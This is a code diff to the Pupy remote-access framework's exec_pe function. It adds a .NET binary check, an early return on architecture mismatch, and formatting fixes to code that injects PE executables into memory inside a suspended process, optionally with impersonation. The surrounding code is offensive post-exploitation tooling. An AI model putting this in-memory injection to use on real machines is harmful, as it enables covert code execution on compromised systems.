@@ -2,9 +2,10 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
-from pupylib.utils.pe import get_pe_arch
+from pupylib.utils.pe import get_pe_arch, is_dotnet_bin
 from modules.lib.utils.cmdrepl import CmdRepl
 import threading
+
 
 def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_impersonation=False, suspended_process="cmd.exe", codepage=None):
     if not raw_pe and not path:
@@ -16,14 +17,19 @@ def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_im
         if pe_arch != proc_arch:
             module.error(
                 '%s is a %s PE and your pupy payload is a %s process. '
-                'Please inject a %s PE or migrate into a %s process first'%(
+                'Please inject a %s PE or migrate into a %s process first' % (
                     path, pe_arch, proc_arch, proc_arch, pe_arch))
+            return
 
+        if is_dotnet_bin(path):
+            module.error(
+                '%s is a .Net binary. Right now this kind of binary is not managed and cannot be loaded '
+                'in memory.' % path)
             return
 
     if not raw_pe:
         raw_pe = b''
-        with open(path,'rb') as f:
+        with open(path, 'rb') as f:
             raw_pe = f.read()
 
     dupHandle = None
@@ -58,7 +64,6 @@ def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_im
         module.client.conn.register_remote_cleanup(
             module.mp.close
         )
-
         if module.mp.execute(complete.set, repl._con_write):
             complete.wait()
             module.mp.close()
@@ -78,6 +83,5 @@ def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_im
             module.success('[Process launched: PID={}]'.format(pid))
         else:
             module.error('Launch failed')
-
 
     return module.mp.stdout
